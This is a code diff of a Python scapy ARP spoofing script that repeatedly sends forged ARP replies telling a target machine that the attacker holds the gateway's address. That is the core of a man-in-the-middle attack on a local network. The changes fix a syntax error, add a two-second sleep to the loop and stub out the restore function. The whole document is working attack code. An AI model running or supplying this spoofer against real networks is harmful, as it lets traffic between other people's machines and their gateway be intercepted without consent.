@@ -2,7 +2,7 @@
 
 import scapy.all as scapy
 import argparse
-
+import time
 
 def get_arguments():
     parser = argparse.ArgumentParser()
@@ -23,16 +23,19 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
-    scapy.send(packet, timeout =1, verbose = False)
+    scapy.send(packet, verbose = False)
 
 def restore():
+    pass
 
 
 options = get_arguments()
 counter = 0
 while True:
    spoof(options.target, options.gateway)
-   print("\r Send packet: ", counter, end=)
+   print("\r Send packet: ", counter, end='' )
    counter +=1
+   time.sleep(2)
+
 
 
